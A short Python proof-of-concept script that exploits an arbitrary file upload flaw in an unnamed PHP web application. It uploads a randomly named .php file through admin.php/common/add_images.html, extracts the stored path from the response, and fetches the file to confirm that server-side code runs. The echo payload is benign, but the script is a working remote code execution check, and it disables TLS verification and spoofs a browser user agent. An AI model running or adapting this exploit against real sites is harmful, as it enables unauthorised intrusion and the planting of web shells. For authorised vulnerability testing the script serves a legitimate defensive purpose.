import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r1=randomLowercase(4)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r2=randomInt(4000000, 4888888)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"admin.php/common/add_images.html"
	body='''-----------------------------57184710441290508793794634494\r
Content-Disposition: form-data; name="file"; filename="'''+r1+'''.php" Content-Type: application/octet-stream\r
\r
<?php echo '''+str(r2)+''';?>\r
-----------------------------57184710441290508793794634494--\r
'''
	headers={'Content-Type': 'multipart/form-data; boundary=---------------------------57184710441290508793794634494'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and ".php" in response.text and "code" in response.text:
		r10=True
		try:
			date=re.findall("public\\\\/edit\\\\/(.+?)\\\\/[0-9a-fA-F]{32}.php",response.text)[0]
			urlpath=re.findall("public\\\\/edit\\\\/[0-9]{8}\\\\/(?P<urlpath>.+?).php",response.text)[0]
		except:
			date=''
			urlpath=''
	else:
		date=''
		urlpath=''
		r10=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+f"public/edit/{date}/{urlpath}.php"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and str(r2) in response.text:
		r20=True
	else:
		r20=False
	if r10 and r20:
		return True
	else:
		return False
